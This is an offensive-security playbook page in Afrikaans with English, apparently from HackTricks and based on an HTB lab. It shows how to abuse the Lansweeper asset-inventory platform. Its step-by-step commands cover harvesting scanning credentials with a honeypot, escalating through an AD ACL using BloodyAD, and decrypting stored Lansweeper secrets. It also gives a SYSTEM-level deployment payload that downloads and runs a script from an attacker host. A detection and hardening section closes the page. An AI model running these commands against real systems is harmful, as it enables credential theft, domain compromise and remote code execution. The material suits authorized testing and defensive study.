# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, en Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper is ’n IT asset discovery- en inventory-platform wat algemeen op Windows ontplooi en met Active Directory geïntegreer word. Credentials wat in Lansweeper gekonfigureer is, word deur sy scanning engines gebruik om oor protokolle soos SSH, SMB/WMI en WinRM by assets te authenticate. Misconfigurations laat dikwels die volgende toe:

- Credential interception deur ’n scanning target na ’n host onder die attacker se beheer (honeypot) te herlei
- Misbruik van AD ACLs wat deur Lansweeper-verwante groepe blootgestel word om remote access te verkry
- On-host decryption van Lansweeper-gekonfigureerde secrets (connection strings en gestoorde scanning credentials)
- Code execution op managed endpoints via die Deployment-feature (wat dikwels as SYSTEM loop)

Hierdie bladsy som praktiese attacker-workflows en commands op om hierdie gedrag tydens engagements te misbruik.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: skep ’n Scanning Target wat na jou host wys en bestaande Scanning Credentials daaraan koppel. Wanneer die scan loop, sal Lansweeper probeer om met daardie credentials te authenticate, en jou honeypot sal dit capture.<sup>[[1]](#references)</sup>

Stappe-oorsig (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (of Single IP) = jou VPN IP
- Configureer die SSH-port na iets wat bereikbaar is (bv. 2022 indien 22 geblokkeer is)
- Disable schedule en beplan om dit manual te trigger
- Scanning → Scanning Credentials → verseker dat Linux/SSH creds bestaan; map dit na die nuwe target (enable almal soos nodig)
- Klik “Scan now” op die target
- Run ’n SSH honeypot en retrieve die attempted username/password

Example met sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Valideer vasgelegde creds teen DC-dienste:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Aantekeninge
- Werk soortgelyk vir ander protokolle wanneer jy die scanner na jou listener kan dwing (SMB/WinRM honeypots, ens.). SSH is dikwels die eenvoudigste.
- Baie scanners identifiseer hulself met kenmerkende client banners (bv. RebexSSH) en sal probeer om onskadelike commands uit te voer (uname, whoami, ens.).

## 2) AD ACL-misbruik: verkry remote access deur jouself by ’n app-admin-groep te voeg

Gebruik BloodHound om effektiewe regte vanaf die gekompromitteerde rekening te enumereer. ’n Algemene bevinding is ’n scanner- of app-spesifieke groep (bv. “Lansweeper Discovery”) wat GenericAll oor ’n bevoorregte groep (bv. “Lansweeper Admins”) het. Indien die bevoorregte groep ook ’n lid van “Remote Management Users” is, word WinRM beskikbaar sodra ons onsself byvoeg.<sup>[[1]](#references)[[5]](#references)</sup>

Voorbeelde van collection:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll op groep met BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kry dan ’n interaktiewe shell:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Wenk: Kerberos-bewerkings is tydsensitief. As jy KRB_AP_ERR_SKEW teëkom, sinkroniseer eers met die DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrypt Lansweeper-gekonfigureerde secrets op die host

Op die Lansweeper-bediener stoor die ASP.NET-webwerf gewoonlik ’n geënkripteerde connection string en ’n symmetric key wat deur die toepassing gebruik word. Met toepaslike plaaslike toegang kan jy die DB connection string dekripteer en dan gestoorde scanning credentials onttrek.<sup>[[1]](#references)</sup>

Tipiese liggings:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Gebruik SharpLansweeperDecrypt om dekripsie en die dump van gestoorde creds te outomatiseer:<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Verwagte uitvoer sluit DB-verbindingsbesonderhede en plaintext-skanderingbewyse in, soos Windows- en Linux-rekeninge wat regdeur die omgewing gebruik word. Hierdie rekeninge het dikwels verhoogde plaaslike regte op domeingashere:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Gebruik herwonne Windows-aanmeldbesonderhede vir bevoorregte toegang:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

As 'n lid van “Lansweeper Admins” stel die web-UI Deployment en Configuration bloot. Onder Deployment → Deployment packages kan jy packages skep wat arbitrêre commands op geteikende assets uitvoer. Uitvoering word deur die Lansweeper-diens met hoë privileges gedoen, wat code execution as NT AUTHORITY\SYSTEM op die geselekteerde host lewer.<sup>[[1]](#references)</sup>

Hoëvlakstappe:
- Create 'n nuwe Deployment package wat 'n PowerShell- of cmd one-liner uitvoer (reverse shell, add-user, ens.).
- Target die gewenste asset (bv. die DC/host waar Lansweeper loop) en klik Deploy/Run now.
- Catch jou shell as SYSTEM.

Voorbeeld-payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows-gebeurtenislogs. Gebruik dit oordeelkundig.

## Opsporing en hardening

- Beperk of verwyder anonymous SMB enumerations. Monitor vir RID cycling en abnormale toegang tot Lansweeper-shares.
- Egress controls: blokkeer of beperk outbound SSH/SMB/WinRM vanaf scannerhosts streng. Genereer waarskuwings vir nie-standaard poorte (bv. 2022) en ongewone client banners soos Rebex.
- Beskerm `Website\\web.config` en `Key\\Encryption.txt`. Plaas secrets ekstern in ’n vault en rotate dit wanneer dit blootgestel word. Oorweeg service accounts met minimale privileges en gMSA waar haalbaar.
- AD-monitering: genereer waarskuwings vir veranderinge aan Lansweeper-verwante groepe (bv. “Lansweeper Admins”, “Remote Management Users”) en vir ACL-veranderinge wat GenericAll/Write-memberskap op privileged groups toestaan.
- Oudit Deployment package-skeppings/-veranderinge/-uitvoerings; genereer waarskuwings vir packages wat cmd.exe/powershell.exe begin of onverwagte outbound connections maak.

## Verwante onderwerpe
- SMB/LSA/SAMR enumeration en RID cycling
- Kerberos password spraying en oorwegings rakende clock skew
- BloodHound path analysis van application-admin-groepe
- WinRM-gebruik en lateral movement

## Verwysings
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
